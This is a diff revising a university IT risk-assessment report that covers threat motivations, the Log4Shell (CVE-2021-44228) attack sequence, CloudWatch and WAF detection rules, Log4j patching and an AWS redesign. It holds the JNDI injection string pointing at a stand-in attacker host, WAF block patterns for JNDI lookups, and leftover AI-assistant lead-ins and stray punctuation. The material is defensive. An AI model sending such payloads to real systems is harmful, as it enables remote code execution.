@@ -68,97 +68,169 @@ This layered design, while flexible, allows the JNDI lookup to be triggered deep
 
 ---
 
+Based on the comprehensive project documentation and analysis logs, here is the detailed breakdown of the IT Risk Assessment Methodology and the Log4Shell Technical Execution path.
+
+***
+
 ## 5. IT Risk Assessment Methodology & Lifecycle
 
-We apply a structured risk lifecycle—Evaluation, Identification, Exposure, Threat, Assessment, and Mitigation—to ensure resources are focused on the highest-impact threats.
+To ensure resources were focused on the highest-impact threats, we applied a structured **Risk Assessment Life Cycle**. This iterative process allowed us to quantify the potential for harm to organizational resources when vulnerabilities are exploited,.
+
+### The Risk Lifecycle Stages
+We executed the assessment through six distinct phases:
+
+* **Evaluation:** The initial phase focused on identifying "Crown Jewel" assets. We asked critical questions: *Which systems are so critical that their failure would halt university operations?*.
+* **Vulnerability Identification:** We reviewed inherent weaknesses in both software and hardware. This included identifying unpatched applications in the Data Center and weak configurations in the Admin Block,.
+* **Exposure Determination:** We calculated the "unprotected portion" of our entities. The legacy Data Center was determined to have high exposure because it lacked essential security controls like Web Application Firewalls (WAF) or IDS/IPS,.
+* **Threat Determination:** We gathered intelligence on internal and external dangers to assets, ranging from negligence to active malice.
+* **Risk Assessment:** We mapped the probability of a threat occurring against its potential impact to determine the risk level.
+* **Risk Mitigation:** The final phase involved planning corrective actions, such as implementing Multi-Factor Authentication (MFA) and patching software.
+
+**[INSERT IMAGE PLACEHOLDER: Fig 3 - Risk Assessment Life Cycle Diagram showing the circular flow from Evaluation to Mitigation]**
 
 ### Crown Jewel Analysis
+We identified specific systems where compromise would necessitate the cessation of university operations. An attack on the confidentiality or integrity of these systems would cause devastating physical, psychological, and reputational harm.
 
-We identified systems so critical that their compromise would necessitate the cessation of university operations. These include the SIS, LMS, and ERP. An attack on the confidentiality or integrity of these systems would cause devastating harm, specifically the exposure of sensitive research data, student financials, and institutional reputation.
+*   **Student Information Systems (SIS):** Specifically **Infinite Campus**, which manages admissions, grades, and student financials.
+*   **Enterprise Resource Planning (ERP):** The **Tibco** system, responsible for finance and HR operations.
+*   **Learning Management System (LMS):** The **Udemy** platform used for course content delivery.
+*   **Facilities Management:** **Forti Insight**, used to manage physical assets and infrastructure.
 
 ### Determining Threat & Psychological Motivations
+Threat modeling required understanding *why* attackers target academic environments. Our assessment identified five primary psychological motivations,,:
 
-Threat modeling must account for why attackers target academic environments. Our assessment identified five primary psychological motivations:
+1.  **Financial Gain:** Cybercriminals driven by extortion (ransomware) or selling stolen data on the dark web.
+2.  **Ideology/Activism:** "Hacktivists" seeking to disrupt operations to promote a cause or protest.
+3.  **Revenge/Retaliation:** Disgruntled staff or students seeking payback for perceived misconduct.
+4.  **Curiosity/Thrill-Seeking:** "Script kiddies" testing their skills for excitement.
+5.  **Espionage/Competitive Advantage:** Nation-state actors or rivals seeking sensitive research data and intellectual property.
 
-* Financial Gain: Extortion through ransomware or selling stolen data.
-* Ideology/Activism: Disrupting operations or "hacktivism."
-* Revenge/Retaliation: Disgruntled staff or students seeking payback.
-* Curiosity/Thrill-Seeking: "Script kiddies" testing their skills.
-* Espionage: Nation-state actors seeking research data and intellectual property.
+**Threat Sources & TTPs:**
+These motivations manifest through three primary attack vectors (Tactics, Techniques, and Procedures):
+*   **Compromised Accounts:** Exploiting valid accounts with weak credentials (e.g., password spraying against Virtual Servers).
+*   **Phishing:** Deceiving staff or students via malicious links to gain an initial foothold.
+*   **Exploiting Public Applications:** Targeting unpatched known vulnerabilities (like Log4j) in the Data Center.
 
-These motivations manifest through three primary TTPs (Tactics, Techniques, and Procedures): compromised accounts with weak credentials, phishing, and the exploitation of unpatched public-facing applications in the Datacenter.
+**[INSERT IMAGE PLACEHOLDER: Fig 3.1 - University’s Possible Threat Sources (Compromised Accounts, Phishing, Exploiting Vulnerabilities)]**
 
----
+***
 
 ## 6. Technical Execution Breakdown: The Log4Shell Attack Path
 
-Understanding the TTPs of the Log4Shell attack is vital for detection engineering. The vulnerability leverages an "internal trust" bypass where the logging framework is manipulated to pivot into the server's OS.
+Understanding the TTPs of the Log4Shell (CVE-2021-44228) attack was vital for our detection engineering. The vulnerability allows for **Remote Code Execution (RCE)** by exploiting the logging framework's ability to perform JNDI lookups.
 
 ### Log4Shell Exploitation Sequence
+The attack leverages a flaw in how Log4j processes log messages, allowing an external entity to dictate code execution. The sequence observed is as follows,,,:
 
-1. Vulnerable Configuration: The application uses a vulnerable Log4j 2 version.
-2. Malicious Input: Attacker sends a crafted string, e.g., ${jndi:ldap://attacker.org/a}.
-3. Interpretation: Log4j processes the string as a command to perform a JNDI lookup.
-4. JNDI Lookup Request: Log4j connects to the attacker’s LDAP server. (Detection point: AWS CloudWatch DNS monitoring).
-5. LDAP Response: Attacker’s server responds with a reference to a malicious Java object.
-6. Remote Object Request: Log4j requests the object from the attacker's web service.
-7. Payload Delivery: The attacker’s service sends a serialized Java object.
-8. Deserialization: The university application receives and deserializes the object.
-9. Remote Code Execution: The malicious code executes with the same privileges as the web server, allowing for immediate lateral movement or data exfiltration.
+1.  **Vulnerable Configuration:** The target web application (e.g., Tibco or vCenter) uses a vulnerable version of Log4j 2.
+2.  **Malicious Input:** The attacker sends a crafted HTTP request containing a malicious string, such as:
+    `${jndi:ldap://attacker.org/a}`
+3.  **Interpretation:** The application logs the input. Log4j parses the string and identifies the special `${jndi:...}` syntax, interpreting it as a command.
+4.  **JNDI Lookup Request:** Log4j initiates an outbound connection to the attacker-controlled LDAP server specified in the string (e.g., `attacker.org`).
+    *   *Detection Point:* This creates a DNS query identifiable in **AWS CloudWatch logs**.
+5.  **LDAP Response:** The attacker's LDAP server responds with a reference to a malicious Java object hosted on a separate web server.
+6.  **Remote Object Request:** Log4j follows the reference and requests the object (payload) from the attacker's web service.
+7.  **Payload Delivery:** The attacker's service delivers the serialized malicious Java object.
+8.  **Deserialization:** The victim application receives and deserializes the object.
+9.  **Remote Code Execution:** Upon deserialization, the malicious code executes within the context of the web application, often with root or administrative privileges.
 
-Security Reasoning: The application incorrectly trusts JNDI to fetch remote data without validation, allowing an external entity to dictate code execution.
+**[INSERT IMAGE PLACEHOLDER: Fig 4.1 - RCE Attack Diagram showing the flow from Attacker to Application to LDAP and back]**
 
----
+### Security Reasoning
+The root cause is an "internal trust" bypass. The application incorrectly trusts JNDI to fetch remote data without validation.
+
+*   **JNDI/LDAP Vector:** While Java removed support for remote codebases in RMI by default, LDAP remote codebases were still allowed in older JDK versions (e.g., prior to 6u211, 7u201, 8u191).
+*   **Mitigation Logic:** This reasoning drove our decision to set `formatMsgNoLookups=true` or surgically remove the `JndiLookup.class` from the JAR files to break step 3 of the kill chain.
+
+Based on the provided source material, here is the detailed explanation of the Detection/Mitigation strategies, Cloud Architecture redesign, and Operational Value of the new security stack.
+
+***
 
 ## 7. Detection and Mitigation Strategies
 
-A "Defense-in-Depth" strategy is required to neutralize Log4Shell, utilizing both active monitoring and tactical patching.
+To neutralize the Log4Shell threat effectively, we adopted a "Defense-in-Depth" strategy. This approach does not rely on a single control but layers active monitoring with tactical, immediate remediation steps.
 
 ### Detection Techniques
+We implemented a two-pronged detection capability leveraging AWS native tools:
 
-* DNS Analysis (AWS CloudWatch): We monitor for patterns like ${jndi:dns:<hostname>} in application logs. This directly neutralizes Step 4 of the exploitation sequence by identifying unauthorized lookups.
-* Vulnerability Scanning (AWS Inspector): Regular scans identify attempted injection events in HTTP/HTTPS requests and DNS lookups.
+*   **DNS Analysis (AWS CloudWatch):**
+    The primary indicator of a Log4Shell attempt is the JNDI lookup. We configured **Amazon CloudWatch** to ingest application logs and audit them for specific DNS request patterns.
+    *   *Signature:* We look for strings matching `${jndi:dns:<host name>}`.
+    *   *Logic:* Identifying this pattern allows us to neutralize **Step 4** of the exploitation sequence (The JNDI Lookup Request) before the payload is downloaded.
+    *   *Alerting:* An **AWS SNS** (Simple Notification Service) workflow was created to trigger immediate alerts to the security team upon detection of these patterns.
+
+*   **Vulnerability Scanning (AWS Inspector):**
+    We utilized **AWS Inspector** to perform daily automated scans. This tool analyzes the application server's network accessibility and inspects HTTP/HTTPS requests and DNS lookups to confirm if the server remains exposed to the vulnerability or if new "Shadow IT" assets have appeared.
+
+**[INSERT IMAGE PLACEHOLDER: Fig 4.2 - Application Server Detection Architecture showing Inspector and CloudWatch integrations]**
 
 ### WAF Implementation Guide
+The Web Application Firewall (WAF) served as our first line of defense, deployed specifically on the **CloudFront** distribution handling ingress traffic.
 
-A Web Application Firewall provides an immediate layer of protection:
-
-* Custom Rules: Add rules to inspect the URI, headers, and body for the strings ${jndi:ldap:// and ${jndi:rmi://.
-* Action: Set action to Block.
-* Monitoring: Monitor for 403 status codes, signifying successful neutralization of an injection attempt.
+*   **Custom Rules:** We created a Web Access Control List (ACL) with custom string match conditions. These rules inspect the **URI, Request Headers, Body, and Query Strings** for the specific exploit signatures:
+    *   `${jndi:ldap://`
+    *   `${jndi:rmi://`
+*   **Action:** The rule action was set to **Block**, ensuring malicious requests are dropped at the edge.
+*   **Monitoring:** We actively monitor WAF logs for **Status Code 403 (Forbidden)**. A spike in 403s indicates successful neutralization of active injection attempts, allowing us to fine-tune rules and reduce false positives.
 
 ### Technical Patching
+While immediate blocking is crucial, permanent remediation requires patching the underlying software.
 
-While upgrading to Log4j 2.17.1 is preferred, the vulnerability can be mitigated by removing the JndiLookup.class from the core archive: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
+1.  **Version Upgrade (Primary):** The gold standard is upgrading to **Log4j 2.17.1**, which addresses all known vulnerabilities (as of Dec 2021).
+2.  **Configuration Hardening:** For legacy versions between 2.10.0 and 2.15.0, we enforced the system property `log4j2.formatMsgNoLookups=true` to disable the lookup mechanism.
+3.  **Surgical Class Removal (Legacy Support):** For systems that could not be immediately patched or recompiled, we executed the following command to strip the vulnerable class from the JAR archive:
+    ```bash
+    zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
+    ```
+    This effectively "rips out" the functionality responsible for the exploit without breaking the entire logging framework.
 
----
+***
 
 ## 8. Strategic Redesign: Secured AWS Cloud Architecture
 
-Migrating from on-premises VMware to AWS shifts the university to a "Secure-by-Design" posture. AWS offers granular control that is unattainable in traditional 3-tier models.
+The migration from on-premises VMware to AWS was not just a "lift and shift," but a transformation to a **"Secure-by-Design"** posture. The traditional 3-tier on-premise model lacked the granular control necessary to defend against modern supply-chain attacks.
 
-Key services include AWS IAM for least-privilege access and Amazon GuardDuty for continuous threat detection. Crucially, we utilize Virtual Private Clouds (VPC) to isolate FTP and Database servers. This isolation protects sensitive student records, including thesis papers, research data, and grade details, from direct internet exposure.
+### Key AWS Services Implemented
+*   **AWS IAM (Identity and Access Management):** replaced broad on-prem permissions with granular, role-based access controls, strictly adhering to the Principle of Least Privilege.
+*   **Amazon GuardDuty:** continuously monitors for malicious activity and unauthorized behavior, providing intelligent threat detection that was absent in the data center.
+*   **Virtual Private Cloud (VPC):**
+    *   We utilized VPCs to create logically isolated network spaces.
+    *   **Crucial Isolation:** The **FTP** and **Database servers** were isolated within private subnets. These servers hold the university's "Crown Jewels"—student thesis papers, research data, and grade details. By removing direct internet gateways for these subnets, we significantly mitigated the risk of data exfiltration.
+
+**[INSERT IMAGE PLACEHOLDER: Fig 6.1 - Revised Security Infrastructure showing VPC isolation and AWS Services]**
 
 ### On-Premises VMware vs. AWS Cloud
+The following table contrasts the limitations of the legacy environment with the capabilities of the new cloud architecture:
 
-| Feature      | On-Premises VMware                        | AWS Cloud                                           |
-| ------------ | ----------------------------------------- | --------------------------------------------------- |
-| Scalability  | Limited by physical hardware constraints. | Unlimited virtual scalability for enrollment peaks. |
-| Availability | Restricted to campus datacenter.          | Global availability across multiple zones/regions.  |
-| Overhead     | High manual maintenance and upgrades.     | Reduced operational overhead; managed services.     |
-| Security     | Manual, inconsistent patching/ACLs.       | Integrated GuardDuty, Inspector, and WAF rules.     |
+| Feature | On-Premises VMware | AWS Cloud |
+| :--- | :--- | :--- |
+| **Scalability** | **Limited.** Constrained by physical hardware and procurement cycles. | **Unlimited.** Elastic scalability handles peak enrollments and exam periods instantly. |
+| **Availability** | **Restricted.** Bound to the campus datacenter; susceptible to local outages. | **Global.** High availability across multiple Availability Zones (AZs) and Regions. |
+| **Overhead** | **High.** IT staff focused on manual hardware maintenance and routine upgrades. | **Reduced.** Managed services allow staff to focus on strategic security initiatives. |
+| **Security** | **Inconsistent.** Manual patching and static firewalls; lack of visibility. | **Integrated.** Native tools like GuardDuty, Inspector, and WAF provide continuous compliance. |
 
----
+***
 
 ## 9. Operational Value: SIEM, SOAR, and Threat Intelligence
 
-Proactive threat hunting is achieved through the integration of Wazuh and AlienVault threat intelligence feeds. This enables the correlation of logs against known Indicators of Compromise (IoCs) and maps alerts to the MITRE ATT&CK framework.
+To move from reactive "fire-fighting" to proactive defense, we implemented a modern Security Operations (SecOps) stack.
 
-To combat credential theft, ZeroFox provides Dark Web Monitoring, identifying leaked university credentials before they are used in an attack.
+### SIEM with Threat Intelligence
+We deployed **Wazuh** as our SIEM, integrated with **AlienVault** threat feeds.
+*   **Correlation:** Wazuh correlates system logs against AlienVault's known Indicators of Compromise (IoCs). This allows us to detect if a server is communicating with an IP address known for distributing malware.
+*   **Behavioral Analysis:** The system detects anomalies, such as deviations in process behavior, and maps these alerts to the **MITRE ATT&CK framework** to give analysts context on the adversary's tactics.
 
-Operational efficiency is driven by Open XDR, which serves as the normalization and orchestration layer (SOAR). This system automates predefined playbooks—such as isolating a server upon detecting a Log4j exploit—while Open EDR agents provide the deep endpoint telemetry required for the investigation.
+**[INSERT IMAGE PLACEHOLDER: Fig 6 - Flow Diagram showing Application Server -> Wazuh + AlienVault -> Slack Alert -> Analyst]**
 
----
+### Dark Web Monitoring (ZeroFox)
+To combat the risk of "Initial Access" via compromised credentials, we implemented **ZeroFox**.
+*   It continuously monitors dark web marketplaces and forums for university email addresses or credentials.
+*   **Value:** If a staff member's credentials are leaked, ZeroFox alerts the security team immediately, allowing us to force a password reset *before* the attacker can use the credentials to login to the VPN or Virtual Servers.
+
+### SOAR Implementation (Open EDR)
+Operational efficiency is driven by **Open XDR**, which serves as our Orchestration layer.
+*   **Automation:** It normalizes data from disparate tools and enables **SOAR (Security Orchestration, Automation, and Response)** capabilities.
+*   **Playbooks:** We configured automated playbooks. For example, if Open EDR detects a process attempting to exploit Log4j, the system can automatically isolate the host from the network to contain the threat without human intervention.
 
 ## 10. Governance & Policy Framework: NIST CSF Alignment
 
@@ -176,7 +248,7 @@ This framework ensures that security is a continuous process rather than a point
 
 ## 11. Conclusion: Demonstrated Professional Competencies
 
-This assessment demonstrates the expertise required to manage risk in complex, high-stakes environments. By bridging the gap between deep technical exploitation and strategic architecture, we have transformed a fragmented security posture into a resilient infrastructure.
+This assessment demonstrates the expertise required to manage risk in complex, high-stakes environments. By bridging the gap between deep technical exploitation and strategic architecture, I have transformed a fragmented security posture into a resilient infrastructure.
 
 ### Core Skills Demonstrated
 
